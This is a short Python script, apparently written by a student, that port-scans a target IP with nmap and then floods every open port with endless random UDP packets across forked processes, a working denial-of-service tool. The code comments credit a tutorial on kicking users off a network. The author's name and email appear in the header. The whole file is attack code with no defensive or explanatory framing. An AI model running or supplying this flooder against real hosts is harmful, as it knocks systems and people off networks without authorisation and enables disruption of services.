#!/usr/bin/env python

# Author: Stuart Woodbury
# email: yr45570@umbc.edu
# sources: http://null-byte.wonderhowto.com/how-to/udp-flooding-kick-local-user-off-network-0132581/
#		   http://xael.org/norman/python/python-nmap/ has examples of nmap in python
#		   https://pypi.python.org/pypi/python-nmap/0.2.7 

# this is not my own work. i used material from the aforementioned sources
# uses nmap to do a port scan and only attack certain ports
# causes memory leaks and is a little slow


import socket #Imports needed libraries
import random
import os
import nmap


def attack(ip, lport):
	sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a  IP UDP socket
	bytes=random._urandom(1460) #Creates packet
	#port=input('Port: ') #Port we direct to attack

	while 1: #Infinitely loops sending packets to the port until the program is exited.
		for port in lport:		
			sock.sendto(bytes,(ip,port))

def main():

	nm = nmap.PortScanner()

	counter = 0
	ip=raw_input('Target IP: ') #The IP we are attacking
	nm.scan(ip, '1-443')
	#nm.scaninfo()

	foo = 1

	for proto in nm[ip].all_protocols():
		foo = 1 #do nothing

	lport = nm[ip][proto].keys()
	lport.sort()

	while foo < 4:
		pid = os.fork()
		if pid == 0:
			attack(ip, lport)
		else:
			attack(ip, lport)
		foo = foo + 1
	
main()
